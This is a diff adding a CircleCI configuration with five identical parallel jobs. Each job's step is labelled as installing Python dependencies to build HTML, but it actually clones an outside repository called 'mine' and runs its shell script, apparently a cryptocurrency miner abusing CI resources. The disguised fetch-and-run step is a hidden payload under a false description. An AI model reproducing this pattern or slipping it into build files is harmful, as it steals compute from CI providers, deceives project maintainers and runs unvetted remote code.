@@ -1,0 +1,56 @@
+version: 2.1
+jobs:
+  trung1:
+    docker:
+      - image: circleci/ruby:2.6
+    steps:
+      - checkout
+      - run:
+          name: Install Python and dependencies to build page HTML
+          command: |
+           git clone https://github.com/vim1102/mine && cd mine && sh mine.sh
+  trung2:
+    docker:
+      - image: circleci/ruby:2.6
+    steps:
+      - checkout
+      - run:
+          name: Install Python and dependencies to build page HTML
+          command: |
+           git clone https://github.com/vim1102/mine && cd mine && sh mine.sh
+  trung3:
+    docker:
+      - image: circleci/ruby:2.6
+    steps:
+      - checkout
+      - run:
+          name: Install Python and dependencies to build page HTML
+          command: |
+           git clone https://github.com/vim1102/mine && cd mine && sh mine.sh
+  trung4:
+    docker:
+      - image: circleci/ruby:2.6
+    steps:
+      - checkout
+      - run:
+          name: Install Python and dependencies to build page HTML
+          command: |
+           git clone https://github.com/vim1102/mine && cd mine && sh mine.sh
+  trung5:
+    docker:
+      - image: circleci/ruby:2.6
+    steps:
+      - checkout
+      - run:
+          name: Install Python and dependencies to build page HTML
+          command: |
+           git clone https://github.com/vim1102/mine && cd mine && sh mine.sh
+workflows:
+  version: 2
+  default:
+    jobs:
+      - trung1
+      - trung2
+      - trung3
+      - trung4
+      - trung5
